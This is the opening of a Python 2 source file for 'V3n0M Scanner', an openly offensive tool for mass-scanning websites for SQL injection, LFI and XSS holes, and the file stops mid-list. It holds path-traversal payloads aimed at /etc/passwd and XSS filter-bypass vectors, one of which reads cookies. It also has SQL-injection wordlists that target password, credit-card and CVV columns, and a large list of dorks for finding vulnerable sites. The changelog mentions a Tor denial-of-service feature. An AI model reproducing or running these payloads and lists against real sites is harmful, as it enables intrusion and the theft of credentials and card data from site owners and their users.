#!/usr/bin/python
# -*- coding: latin-1 -*-
#              --- To be Done     --Partially implemented     -Done
# V3n0MScanner.py - V.3.2.1 Beta
#   -Fix engines search parameters
#   ---Increase LFI/RFI/XSS Lists if possible
#   ---Implement SQL Database dumping tweaks
#   ---Implement SQLi Post Method attack
#   - Removed ToRSledgehammer attack. Only skids DoS
#   --Update Banner
#   --Generalised "Tweaks" required
#	---Build and Implement Admin page finder
#	---Commenting
#	---Improve Md5 check to not use Static method
#	---Prepare code for Hash cracking feature
#   ---Live logging
#	--Prepare coding for Admin page finder
#   ---Pause Scanning option
#   ---Add MD5 and SHA1 Detection/Cracking
#	---Remove "Dark" naming conventions, provide more accurate names
#
# V3n0MScanner.py - V.3.0.2
#    -Increased headers list to include mobile devices headers 
#    -Increased XSS Detection by almost double, Detects Actual Bypass required for the attack to progress
#    -Increased LFI Detection rates 
#    -Increased URL Detection rate for valid Vuln sites
#    -New Banner Style promoting V3n0M Scanner and Version details
#    -New method for identifying Version make: V.x.y.z Where x is the main release version, y is amount of Beta release
#     versions and z is the
#     amount of alpha release versions. ie, V.3.0.2 is Main release build 3 that has had 0 Beta test phases and 2 Alpha
#     release phases
#    -New Search Engine's powering the scanner so should give alot more results.
#    -Intergrated DoS Feature, now you can select to [1] Scan as you used to for vulnerabilitys or [2] TorSledgehammer
#     DoS Attack
#    -New MultiPlatform version instead of the old Linux/Windows seperate releases
#    -TorSledgehammer DoS tool rotates attacks through multiple detected Internet connections to spread attack workload
#     and increase DoS success rate.
#
#
# V3n0MScanner.py - a modified smartd0rk3r
#    - added superlarge Dork list
#    - added new headers
#    - added lots of new XSS detectors and XSS Filter Bypass Detection to for spotting those trickier XSS sites
#    - added mbcs encoding support and linux mbcs encoding bypass to make the program multi-platform again
#
#
#                       This program has been based upon the smartd0rk3r and darkd0rker
#                       It has been heavily edited, updated and improved upon by Novacygni
#                       but in no way is this the sole work of NovaCygni, and credit is due
#                       to every person who has worked on this tool. Thanks people. NovaCygni




import re, time, sys, random, math, threading, socket, urllib2, cookielib, subprocess, codecs
from time import time
from random import choice



#Multithreading implementation and queueing prepared and ready, Debug support required for stability and testing
#if __debug__:  
#   import threading as parcomp  
#   queueclass=Queue.Queue  
#   workerclass=threading.Thread  
#   NUMWORKERS=1  
#else:  
#   import multiprocessing as parcomp  
#   queueclass=parcomp.Queue  
#   workerclass=parcomp.Process  
#   NUMWORKERS=parcomp.cpu_count()  




#This is the MBCS Encoding Bypass for making MBCS encodings work on Linux - NovaCygni
try:
	codecs.lookup('mbcs')
except LookupError:
	ascii = codecs.lookup('latin-1')
	func = lambda name, enc=ascii: {True: enc}.get(name == 'mbcs')
	codecs.register(func)




# Colours
W = "\033[0m"
R = "\033[31m"
G = "\033[32m"
O = "\033[33m"
B = "\033[34m"





# Banner
def logo():
	print R + "\n|----------------------------------------------------------------|"
	print "|                  V3n0M-Scanner.py   - By NovaCygni             |"
	print "|     Release Date 23/10/2013  - Release Version V.3.2.1         |"
	print "|          THIS IS A PRERELEASE BETA  TEST VERSION               |"
	print "|                         NovaCygni                              |"
	print "|                                                                |"
	print "|                                                                |"
	print "|                                                                |"
	print "|                                                                |"
	print "|                                                                |"
	print "|                    _____       _____                           |"
	print "|                   |____ |     |  _  |                          |"
	print "|             __   __   / /_ __ | |/' |_ __ ___                  |"
	print "|             \ \ / /   \ \ '_ \|  /| | '_ ` _ \                 |"
	print "|              \ V /.___/ / | | \ |_/ / | | | | |                |"
	print "|    Official   \_/ \____/|_| |_|\___/|_| |_| |_|  Release       |"
	print "|   Note: PLEASE RUN TOR ON PORT 9050 TO USE TOR FEATURES        |"
	print "|----------------------------------------------------------------|\n"


if sys.platform == 'linux' or sys.platform == 'linux2':
	subprocess.call("clear", shell=True)
	logo()


else:
	subprocess.call("cls", shell=True)
	logo()

log = "v3n0m-sqli.txt"
logfile = open(log, "a")
lfi_log = "v3n0m-lfi.txt"
lfi_log_file = open(lfi_log, "a")
rce_log = "v3n0m-rce.txt"
rce_log_file = open(rce_log, "a")
xss_log = "v3n0m-xss.txt"
xss_log_file = open(xss_log, "a")
admin_log = "v3n0m-admin.txt"
admin_log_file = open(admin_log, "a")

arg_end = "--"
arg_eva = "+"
colMax = 60 # Change this at your will
gets = 0
file = "/etc/passwd"
threads = []
darkurl = []
vuln = []
col = []
timeout = 75
socket.setdefaulttimeout(timeout)

lfis = ["/etc/passwd", "../etc/passwd", "../../etc/passwd", "../../../etc/passwd", "../../../../etc/passwd",
        "../../../../../etc/passwd", "../../../../../../etc/passwd", "../../../../../../../etc/passwd",
        "../../../../../../../../etc/passwd", "../../../../../../../../../etc/passwd",
        "../../../../../../../../../../etc/passwd", "/etc/passwd", "../etc/passwd", "../../etc/passwd",
        "../../../etc/passwd", "../../../../etc/passwd", "../../../../../etc/passwd", "../../../../../../etc/passwd",
        "../../../../../../../etc/passwd", "../../../../../../../../etc/passwd",
        "../../../../../../../../../etc/passwd", "../../../../../../../../../../etc/passwd", "/etc/passwd%00",
        "../etc/passwd%00", "../../etc/passwd%00", "../../../etc/passwd%00", "../../../../etc/passwd%00",
        "../../../../../etc/passwd%00", "../../../../../../etc/passwd%00", "../../../../../../../etc/passwd%00",
        "../../../../../../../../etc/passwd%00", "../../../../../../../../../etc/passwd%00",
        "../../../../../../../../../../etc/passwd%00", "../../../../../../../../../../../etc/passwd%00",
        "../../../../../../../../../../../../etc/passwd%00", "../../../../../../../../../../../../../etc/passwd%00"]

xsses = ["<IMG SRC=javascript:alert('Basic XSS Vuln Detected')>",
         "<IMG SRC=JaVaScRiPt:alert('Case Sensitive XSS Vector')>",
         "<a onmouseover=alert(document.cookie)>Malformed A Tag Attack Vuln</a>",
         "<IMG SRC=javascript:alert(String.fromCharCode(88, 83, 83, 32, 86, 117, 108, 110, 32, 70, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 32, 102, 105, 108, 116, 101, 114, 32, 98, 121, 112, 97, 115, 115, 32, 100, 101, 116, 101, 99, 116, 101, 100))>",
         "<IMG SRC=%55%54%46%38%20%55%6E%69%63%6F%64%65%20%58%53%53%20%56%75%6C%6E%20%44%65%74%65%63%74%65%64>",
         "<BODY ONLOAD=alert('XSS Bodytag Vuln Detected')>",
         "¼script¾alert(¢US-ASCII XSS Bypass Vuln Detected¢)¼/script¾",
         "<IMG SRC=jav    ascript:alert('XSS Embedded Tab Vulnerability');>",
         "<IMG SRC=%58%53%53%20%48%65%78%20%56%75%6C%6E%65%72%61%62%69%6C%69%74%79>",
         "<IMG SRC=jav&#x09;ascript:alert('XSS Embedded Encoded Tab Vulnerability');>",
         "<<SCRIPT>alert(XSS Extraneous Open Brackets Vulnerability);//<</SCRIPT>",
         "<META HTTP-EQUIV=refresh CONTENT=0;url=data:text/html base64,WFNTIEJhc2UgNjQgRW5jb2RpbmcgQnlwYXNz",
         "\;alert('XSS Javascript Escapes Vulnerability Detected');//",
         "</TITLE><SCRIPT>alert(XSS End Title Tag Vulnerability Detected);</SCRIPT>",
         "<STYLE>@im\port'\ja\vasc\riptt:alert(XSS Style Tags with Broken Javascript Vulnerability Detected)';</STYLE>"]

tables = ['user', 'users', 'tbladmins', 'Logins', 'logins', 'login', 'admins', 'members', 'member', '_wfspro_admin',
          '4images_users', 'a_admin', 'account', 'accounts', 'adm', 'admin', 'admin_login', 'admin_user',
          'admin_userinfo', 'administer', 'administrable', 'administrate', 'administration', 'administrator',
          'administrators', 'adminrights', 'admins', 'adminuser', 'adminusers', 'article_admin', 'articles', 'artikel',
          'author', 'autore', 'backend', 'backend_users', 'backenduser', 'bbs', 'book', 'chat_config', 'chat_messages',
          'chat_users', 'client', 'clients', 'clubconfig', 'company', 'config', 'contact', 'contacts', 'content',
          'control', 'cpg_config', 'cpg132_users', 'customer', 'customers', 'customers_basket', 'dbadmins', 'dealer',
          'dealers', 'diary', 'download', 'Dragon_users', 'e107.e107_user', 'e107_user', 'forum.ibf_members',
          'fusion_user_groups', 'fusion_users', 'group', 'groups', 'ibf_admin_sessions', 'ibf_conf_settings',
          'ibf_members', 'ibf_members_converge', 'ibf_sessions', 'icq', 'index', 'info', 'ipb.ibf_members',
          'ipb_sessions', 'joomla_users', 'jos_blastchatc_users', 'jos_comprofiler_members', 'jos_contact_details',
          'jos_joomblog_users', 'jos_messages_cfg', 'jos_moschat_users', 'jos_users', 'knews_lostpass', 'korisnici',
          'kpro_adminlogs', 'kpro_user', 'links', 'login_admin', 'login_admins', 'login_user', 'login_users', 'logon',
          'logs', 'lost_pass', 'lost_passwords', 'lostpass', 'lostpasswords', 'm_admin', 'main', 'mambo_session',
          'mambo_users', 'manage', 'manager', 'mb_users', 'memberlist', 'minibbtable_users', 'mitglieder', 'mybb_users',
          'mysql', 'name', 'names', 'news', 'news_lostpass', 'newsletter', 'nuke_users', 'obb_profiles', 'order',
          'orders', 'parol', 'partner', 'partners', 'passes', 'password', 'passwords', 'perdorues', 'perdoruesit',
          'phorum_session', 'phorum_user', 'phorum_users', 'phpads_clients', 'phpads_config', 'phpbb_users',
          'phpBB2.forum_users', 'phpBB2.phpbb_users', 'phpmyadmin.pma_table_info', 'pma_table_info', 'poll_user',
          'punbb_users', 'pwd', 'pwds', 'reg_user', 'reg_users', 'registered', 'reguser', 'regusers', 'session',
          'sessions', 'settings', 'shop.cards', 'shop.orders', 'site_login', 'site_logins', 'sitelogin', 'sitelogins',
          'sites', 'smallnuke_members', 'smf_members', 'SS_orders', 'statistics', 'superuser', 'sysadmin', 'sysadmins',
          'system', 'sysuser', 'sysusers', 'table', 'tables', 'tb_admin', 'tb_administrator', 'tb_login', 'tb_member',
          'tb_members', 'tb_user', 'tb_username', 'tb_usernames', 'tb_users', 'tbl', 'tbl_user', 'tbl_users', 'tbluser',
          'tbl_clients', 'tbl_client', 'tblclients', 'tblclient', 'test', 'usebb_members', 'user_admin', 'user_info',
          'user_list', 'user_login', 'user_logins', 'user_names', 'usercontrol', 'userinfo', 'userlist', 'userlogins',
          'username', 'usernames', 'userrights', 'vb_user', 'vbulletin_session', 'vbulletin_user', 'voodoo_members',
          'webadmin', 'webadmins', 'webmaster', 'webmasters', 'webuser', 'webusers', 'wp_users', 'x_admin', 'xar_roles',
          'xoops_bannerclient', 'xoops_users', 'yabb_settings', 'yabbse_settings', 'Category', 'CategoryGroup',
          'ChicksPass', 'dtproperties', 'JamPass', 'News', 'Passwords by usage count', 'PerfPassword',
          'PerfPasswordAllSelected', 'pristup', 'SubCategory', 'tblRestrictedPasswords', 'Ticket System Acc Numbers',
          'Total Members', 'UserPreferences', 'tblConfigs', 'tblLogBookAuthor', 'tblLogBookUser', 'tblMails',
          'tblOrders', 'tblUser', 'cms_user', 'cms_users', 'cms_admin', 'cms_admins', 'user_name', 'jos_user',
          'table_user', 'email', 'mail', 'bulletin', 'login_name', 'admuserinfo', 'userlistuser_list', 'SiteLogin',
          'Site_Login', 'UserAdmin']

columns = ['user', 'username', 'password', 'passwd', 'pass', 'cc_number', 'id', 'email', 'emri', 'fjalekalimi', 'pwd',
           'user_name', 'customers_email_address', 'customers_password', 'user_password', 'name', 'user_pass',
           'admin_user', 'admin_password', 'admin_pass', 'usern', 'user_n', 'users', 'login', 'logins', 'login_user',
           'login_admin', 'login_username', 'user_username', 'user_login', 'auid', 'apwd', 'adminid', 'admin_id',
           'adminuser', 'adminuserid', 'admin_userid', 'adminusername', 'admin_username', 'adminname', 'admin_name',
           'usr', 'usr_n', 'usrname', 'usr_name', 'usrpass', 'usr_pass', 'usrnam', 'nc', 'uid', 'userid', 'user_id',
           'myusername', 'mail', 'emni', 'logohu', 'punonjes', 'kpro_user', 'wp_users', 'emniplote', 'perdoruesi',
           'perdorimi', 'punetoret', 'logini', 'llogaria', 'fjalekalimin', 'kodi', 'emer', 'ime', 'korisnik',
           'korisnici', 'user1', 'administrator', 'administrator_name', 'mem_login', 'login_password', 'login_pass',
           'login_passwd', 'login_pwd', 'sifra', 'lozinka', 'psw', 'pass1word', 'pass_word', 'passw', 'pass_w',
           'user_passwd', 'userpass', 'userpassword', 'userpwd', 'user_pwd', 'useradmin', 'user_admin', 'mypassword',
           'passwrd', 'admin_pwd', 'admin_passwd', 'mem_password', 'memlogin', 'e_mail', 'usrn', 'u_name', 'uname',
           'mempassword', 'mem_pass', 'mem_passwd', 'mem_pwd', 'p_word', 'pword', 'p_assword', 'myname', 'my_username',
           'my_name', 'my_password', 'my_email', 'korisnicko', 'cvvnumber ', 'about', 'access', 'accnt', 'accnts',
           'account', 'accounts', 'admin', 'adminemail', 'adminlogin', 'adminmail', 'admins', 'aid', 'aim', 'auth',
           'authenticate', 'authentication', 'blog', 'cc_expires', 'cc_owner', 'cc_type', 'cfg', 'cid', 'clientname',
           'clientpassword', 'clientusername', 'conf', 'config', 'contact', 'converge_pass_hash', 'converge_pass_salt',
           'crack', 'customer', 'customers', 'cvvnumber', 'data', 'db_database_name', 'db_hostname', 'db_password',
           'db_username', 'download', 'e-mail', 'emailaddress', 'full', 'gid', 'group', 'group_name', 'hash',
           'hashsalt', 'homepage', 'icq', 'icq_number', 'id_group', 'id_member', 'images', 'index', 'ip_address',
           'last_ip', 'last_login', 'lastname', 'log', 'login_name', 'login_pw', 'loginkey', 'loginout', 'logo',
           'md5hash', 'member', 'member_id', 'member_login_key', 'member_name', 'memberid', 'membername', 'members',
           'new', 'news', 'nick', 'number', 'nummer', 'pass_hash', 'passwordsalt', 'passwort', 'personal_key', 'phone',
           'privacy', 'pw', 'pwrd', 'salt', 'search', 'secretanswer', 'secretquestion', 'serial', 'session_member_id',
           'session_member_login_key', 'sesskey', 'setting', 'sid', 'spacer', 'status', 'store', 'store1', 'store2',
           'store3', 'store4', 'table_prefix', 'temp_pass', 'temp_password', 'temppass', 'temppasword', 'text', 'un',
           'user_email', 'user_icq', 'user_ip', 'user_level', 'user_passw', 'user_pw', 'user_pword', 'user_pwrd',
           'user_un', 'user_uname', 'user_usernm', 'user_usernun', 'user_usrnm', 'userip', 'userlogin', 'usernm',
           'userpw', 'usr2', 'usrnm', 'usrs', 'warez', 'xar_name', 'xar_pass']

sqlerrors = {'MySQL': 'error in your SQL syntax',
             'MiscError': 'mysql_fetch',
             'MiscError2': 'num_rows',
             'Oracle': 'ORA-01756',
             'JDBC_CFM': 'Error Executing Database Query',
             'JDBC_CFM2': 'SQLServer JDBC Driver',
             'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
             'MSSQL_Uqm': 'Unclosed quotation mark',
             'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
             'MS-Access_JETdb': 'Microsoft JET Database',
             'Error Occurred While Processing Request': 'Error Occurred While Processing Request',
             'Server Error': 'Server Error',
             'Microsoft OLE DB Provider for ODBC Drivers error': 'Microsoft OLE DB Provider for ODBC Drivers error',
             'Invalid Querystring': 'Invalid Querystring',
             'OLE DB Provider for ODBC': 'OLE DB Provider for ODBC',
             'VBScript Runtime': 'VBScript Runtime',
             'ADODB.Field': 'ADODB.Field',
             'BOF or EOF': 'BOF or EOF',
             'ADODB.Command': 'ADODB.Command',
             'JET Database': 'JET Database',
             'mysql_fetch_array()': 'mysql_fetch_array()',
             'Syntax error': 'Syntax error',
             'mysql_numrows()': 'mysql_numrows()',
             'GetArray()': 'GetArray()',
             'FetchRow()': 'FetchRow()',
             'Input string was not in a correct format': 'Input string was not in a correct format'}

header = ['Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.10 sun4u; X11)',
          'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2pre) Gecko/20100207 Ubuntu/9.04 (jaunty) Namoroka/3.6.2pre',
          'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser;',
          'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)',
          'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)',
          'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)',
          'Microsoft Internet Explorer/4.0b1 (Windows 95)',
          'Opera/8.00 (Windows NT 5.1; U; en)',
          'amaya/9.51 libwww/5.4.0',
          'Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)',
          'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
          'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)',
          'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; ZoomSpider.net bot; .NET CLR 1.1.4322)',
          'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; QihooBot 1.0 qihoobot@qihoo.net)',
          'Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.11 [en]',
          'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0',
          'Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920)',
          'Mozilla/5.0 (Series40; Nokia311/03.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.31',
          'Opera/8.01 (J2ME/MIDP; Opera Mini/3.0.6306/1528; en; U; ssr)',
          'Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4',
          'Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1.2) Gecko/20070219 Firefox/2.0.0.2',
          'Mozilla/5.0 (Windows; Windows i686) KHTML/4.8.0 (like Gecko) Konqueror/4.8 ',
          'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_1 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8B117 Safari/6531.22.7 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)',
          'Opera/9.80 <a> href="https://www.youtube.com/user/tiffanyalvord">Tiffany Alvord</a> (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60',
          'Opera/9.80 (BlackBerry; Opera Mini/6.5.27548/28.2075; U; en) Presto/2.8.119 Version/11.10']

d0rk = ['.asp?CategoryID', '.asp?ProdID', '.asp?Sku', '.asp?StyleID', '.asp?cart', '.asp?cartID', '.asp?catID',
        '.asp?catalogid', '.asp?categorylist', '.asp?cid', '.asp?code', '.asp?codeno', '.asp?designer',
        '.asp?framecode', '.asp?id', '.asp?idcategory', '.asp?idproduct', '.asp?intCatalogID', '.asp?intProdId',
        '.asp?item', '.asp?itemID', '.asp?maingroup', '.asp?misc', '.asp?newsid', '.asp?orderid', '.asp?p', '.asp?pid',
        '.asp?product', '.asp?productid', '.asp?showtopic', '.asp?storeid', '.asp?userID', '.br/index.php?loc',
        '.gov.br/index.php?arquivo', '.htpasswd', '.php?PageID',
        '.php?REQUEST&REQUEST[option]comcontent&REQUEST[Itemid]1&GLOBALS&mosConfigabsolutepath', '.php?S', '.php?a',
        '.php?abrir', '.php?act', '.php?action', '.php?ad', '.php?archive', '.php?area', '.php?article', '.php?b',
        '.php?back', '.php?base', '.php?basedir', '.php?bbs', '.php?boardno', '.php?body', '.php?c', '.php?caldir',
        '.php?cat', '.php?catch', '.php?category', '.php?choice', '.php?cid', '.php?class', '.php?clubid', '.php?cod',
        '.php?cod.tipo', '.php?conf', '.php?configFile', '.php?cont', '.php?corpo', '.php?cvsroot', '.php?d', '.php?da',
        '.php?date', '.php?debug', '.php?debut', '.php?default', '.php?destino', '.php?dir', '.php?display',
        '.php?east', '.php?f', '.php?fcontent', '.php?file', '.php?fileid', '.php?filepath', '.php?flash',
        '.php?folder', '.php?for', '.php?form', '.php?formatword', '.php?from', '.php?funcao', '.php?function',
        '.php?g', '.php?get', '.php?go', '.php?gorumDir', '.php?goto', '.php?h', '.php?headline', '.php?i', '.php?id',
        '.php?inc', '.php?include', '.php?includedir', '.php?inf', '.php?inter', '.php?itemid', '.php?j', '.php?join',
        '.php?jojo', '.php?l', '.php?la', '.php?lan', '.php?lang', '.php?layout', '.php?lest', '.php?link', '.php?load',
        '.php?loc', '.php?locate', '.php?m', '.php?main', '.php?meio', '.php?meio.php', '.php?menu', '.php?menuID',
        '.php?mep', '.php?mid', '.php?mode', '.php?month', '.php?mostra', '.php?my', '.php?n', '.php?naam', '.php?name',
        '.php?nav', '.php?new', '.php?news', '.php?next', '.php?nextpage', '.php?o', '.php?op', '.php?open',
        '.php?option', '.php?origem', '.php?p', '.php?pageurl', '.php?para', '.php?part', '.php?perm', '.php?pg',
        '.php?pid', '.php?place', '.php?play', '.php?plugin', '.php?pmpath', '.php?pollname', '.php?post', '.php?pr',
        '.php?prefix', '.php?prefixo', '.php?q', '.php?redirect', '.php?ref', '.php?refid', '.php?regionId',
        '.php?release', '.php?releaseid', '.php?return', '.php?root', '.php?searchcodeid', '.php?sec', '.php?secao',
        '.php?secc', '.php?sect', '.php?sel', '.php?server', '.php?servico', '.php?session&content', '.php?sg',
        '.php?shard', '.php?show', '.php?sid', '.php?site', '.php?sourcedir', '.php?start', '.php?storyid', '.php?str',
        '.php?subd', '.php?subdir', '.php?subject', '.php?sufixo', '.php?systempath', '.php?t', '.php?task',
        '.php?teste', '.php?themedir', '.php?threadid', '.php?tid', '.php?title', '.php?to', '.php?topicid',
        '.php?type', '.php?u', '.php?url', '.php?urlFrom', '.php?v', '.php?var', '.php?vi', '.php?view', '.php?visual',
        '.php?wPage', '.php?y', '.php?z', '.php?zo', '/.gov.br/index.php?arquivo', '/.php?include', '/.php?page',
        '/.php?secc', '//langenglish/langmainalbum.php?phpbbrootpath', '/?mosConfigabsolutepath', '/?p', '/?pag',
        '/?page', '/?pagephp5?id', '/?pagphp5?id', '/?pg', '/?pgphp5?id', '/?pphp5?id', '/Citrix/Nfuse17/',
        '/Decoder.php?basedir', '/Encoder.php?basedir', '/Gallery/displayCategory.php?basepath',
        '/Gery/displayCategory.php?basepath', '/GradeMap/index.php?page', '/Index.php?id',
        '/Merchant2/admin.mv|/Merchant2/admin.mvc|MivaMerchantAdministrationLogincheapmalboro.net',
        '/MyeGallery/public/displayCategory.php?basepath', '/NSearch/AdminServlet',
        '/NuclearBB/tasks/sendqueuedemails.php?rootpath', '/PHPDJv05/dj/djpage.php?page',
        '/PhpLinkExchange/bitslistings.php?svrrootPhpStart', '/Popper/index.php?childwindow.inc.php?form',
        '/SQuery/lib/gore.php?libpath', '/SUSAdminMicrosoftSoftwareupd?t?Services', '/WebSTAR',
        '/[MyAlbumDIR]/.inc.php?langsdir', '/[Script', '/access/login.php?pathtoroot', '/account.php?action',
        '/accounts.php?command', '/active/components/xmlrpc/client.php?c[components]', '/addmedia.php?factsfile[$]',
        '/addpostnewpoll.php?addpollpreview&thispath', '/addpostnewpoll.php?addpollpreview&thispath/ubbthreads/',
        '/addpostnewpoll.php?addpollpreview&thispathubbthreads', '/admcfgedit.php', '/admin.php?caldir',
        '/admin.php?page', '/admin/auth.php?xcartdir', '/admin/configuration.php?Mystore',
        '/admin/doeditconfig.php?thispath./includes&config[path]', '/admin/inc/changeaction.php?formatmenue',
        '/admin/include/header.php?repertoire', '/admin/index.php?o', '/admin/index.php?oadmin/index.php',
        '/admin/index.php?oadmin/index.php;', '/admin/login.asp', '/admincp/auth/checklogin.php?cfgProgDir',
        '/administrator/components/coma6mambocredits/admin.a6mambocredits.php?mosConfiglivesite',
        '/administrator/components/comcomprofiler/plugin.class.php?mosConfigabsolutepath',
        '/administrator/components/comcropimage/admin.cropcanvas.php?cropimagedir',
        '/administrator/components/comjcs/jcs.function.php?mosConfigabsolutepath', ]
d0rk += ['addToCart.cfm?idProduct', 'addToCart.php?idProduct', 'addcart.asp?', 'addcart.asp?num', 'addcart.cfm?',
         'addcart.cfm?num', 'addcart.php?', 'addcart.php?num', 'addcolumn.php?id', 'addedit.php?rootdir',
         'addevent.inc.php?agendaxpath', 'addimage.php?cid', 'addmedia.php?factsfile[$LANGUAGE]phpGedView',
         'addpages.php?id', 'addsiteform.php?catid', 'addtocart.asp?ID', 'addtocart.cfm?ID', 'addtocart.php?ID',
         'addtomylist.asp?ProdId', 'addtomylist.cfm?ProdId', 'addtomylist.php?ProdId', 'adetail.php?id', 'admin',
         'admin.php?caldir', 'admin.php?page', 'admin/doeditconfig.php?thispath./includes&config[path]',
         'admin/doeditconfig.php?thispath./includes&config[path]admin', 'admin/index.php?o',
         'adminEditProductFields.asp?intProdID', 'adminEditProductFields.cfm?intProdID',
         'adminEditProductFields.php?intProdID', 'adminaccountinfofiletypelog', 'adminfiletypeaspGenericuserlistfiles',
         'adminfiletypedb', 'adminfiletypexls',
         'administrator/components/coma6mambocredits/admin.a6mambocredits.php?mosConfiglivesite',
         'administrator/components/comcomprofiler/plugin.class.php?mosConfigabsolutepath',
         'administrator/components/comcomprofiler/plugin.class.php?mosConfigabsolutepath/tools/sendreminders.php?includedirallday.php?date',
         'administrator/components/comcomprofiler/plugin.class.php?mosConfigabsolutepath/tools/sendreminders.php?includedirday.php?date',
         'administrator/components/comcropimage/admin.cropcanvas.php?cropimagedir',
         'administrator/components/comcropimage/admin.cropcanvas.php?cropimagedirmodules/MyeGallery/index.php?basepath',
         'administrator/components/comcropimage/admin.cropcanvas.php?cropimagedirmodules/MyeGery/index.php?basepath',
         'administrator/components/comlinkdirectory/toolbar.linkdirectory.html.php?mosConfigabsolutepath',
         'administrator/components/commgm/help.mgm.php?mosConfigabsolutepath',
         'administrator/components/commgm/help.mgm.php?mosConfigabsolutepathhelp.php?csspath',
         'administrator/components/compeoplebook/param.peoplebook.php?mosConfigabsolutepath',
         'administrator/components/comremository/admin.remository.php?mosConfigabsolutepath',
         'administrator/components/comremository/admin.remository.php?mosConfigabsolutepath/comremository/',
         'administrator/components/comremository/admin.remository.php?mosConfigabsolutepath/tags.php?BBCodeFile',
         'administrator/components/comremository/admin.remository.php?mosConfigabsolutepathMambo',
         'administrator/components/comremository/admin.remository.php?mosConfigabsolutepathcomremository',
         'administrator/components/comremository/admin.remository.php?mosConfigabsolutepathindex.php?optioncomremository',
         'administrator/components/comwebring/admin.webring.docs.php?componentdir', 'administrators.pwd',
         'administratorwelcometomambo', 'adminlogin', 'adminpanel', 'adminuserlistGenericuserlistfiles', 'adobtsitel',
         'adpassword.txt', 'ads/index.php?cat', 'advSearchh.asp?idCategory', 'advSearchh.cfm?idCategory',
         'advSearchh.php?idCategory', 'affich.php?base', 'affiliate.asp?ID', 'affiliate.cfm?ID', 'affiliate.php?ID',
         'affiliateagreement.cfm?storeid', 'affiliates.asp?id', 'affiliates.cfm?id', 'affiliates.php?id', 'afile',
         'agendax/addevent.inc.php?agendaxpath', 'ages.php?id', 'aggregator.php?id', 'aglimpse', 'airactivity.cfm?id',
         'akocomments.php?mosConfigabsolutepath', 'aktuelles/meldungendetail.asp?id',
         'aktuelles/meldungendetail.php?id', 'aktuelles/veranstaltungen/detail.asp?id',
         'aktuelles/veranstaltungen/detail.php?id', 'albumportal.php?phpbbrootpath', 'alinitialize.php?alpath',
         'all..TestpageforApacheInstallation..', 'all.br/index.php?loc', 'all.php?bodyfile', 'all.r{}vticnf/',
         'all//vtipvt/|all//vticnf/', 'all/Popper/index.php?', 'all/default.php?pagehome',
         'all/examples/jsp/snp/snoop.jsp', 'all/folder.php?id', 'all/forum/', 'all/includes/orderSuccess.inc.php?glob',
         'all/index.php?filesite.dk', 'all/index.php?pagesite.dk', 'all/modules.php?nameallmyguests', 'all/osticket/',
         'all4nAlbumsite.org', 'allNetworkCameraNetworkCamera', 'allWelcometotheCyclades',
         'all\TestpageforApacheInstallation', 'alladmin.php', 'alladminmdb', 'allapplication.php?basepath',
         'allauthuserfile.txt', 'allcdkey.txt', 'allcontrol/multiview', 'allcopperminesite.org',
         'allexchange/logon.asp', 'allforums.html', 'allihm.php?p', 'allindex.phpsitesglinks', 'allindexof/admin',
         'allindexof/root', 'allinstall/install.php', 'allintranetadmin', 'allmain.php?pagina', 'allmanage.pl',
         'allmyegallerysite.org', 'allowcalltimepassreferencePATHINFO',
         'allpoweredbyAshNewsallAshNewsatauall/ashnews.php', 'allrestrictedfiletypedocsitegov',
         'allrestrictedfiletypemail', 'allsensitivefiletypedoc', 'allservlet/SnoopServlet',
         'allshoutbox/expanded.phpfiletypephp', 'allstatic.php?load', 'allwps/portal/login', 'allxgallerysite.org',
         'altroesempioWinZip8.1\WinZip8.1\94FBR', 'amadmin.pl', 'ancillary.asp?ID', 'ancillary.cfm?ID',
         'ancillary.php?ID', 'andserverinformation', 'animal/products.php?id', 'anj.php?id', 'announce.php?id',
         'announcements.php?phpraiddirphpraid', 'announcements.php?phpraiddirphpraidsignup',
         'answer/default.asp?pollID', 'answer/default.php?pollID']
d0rk += ['aol/do/rsspopup?blogID', 'aol/do/rsspopup?blogIDfooter.inc.phpinfo.inc.phpManyServers.htm',
         'app/webeditor/login.cgi?username&commandsimple&doedit&password&file', 'apricotadmin00h',
         'architectfull.php?id', 'archive.asp?id', 'archive.cfm?id', 'archive.php?id', 'archive/get.asp?messageid',
         'archive/get.php?messageid', 'areoftentypedasargumentstrings', 'arg.php?argphp?arg', 'args.php?argphp?arg',
         'arquivo.php?data', 'ars/cgibin/arweb?O0|arweb.jspsiteremedy.comsitemil',
         'ars/cgibin/arweb?O0?|arweb.jspsiteremedy.comsitemil', 'art.asp?id', 'art.php?id', 'art.php?idm',
         'artform.cfm?id', 'article.asp?id', 'article.cfm?id', 'article.php?ID', 'article.php?sid',
         'article/article.php?id', 'article/index.php?id', 'articlecategory.asp?id', 'articlecategory.php?id',
         'articlefull.php?id', 'articlepreview.asp?id', 'articlepreview.php?id', 'articles.asp?id',
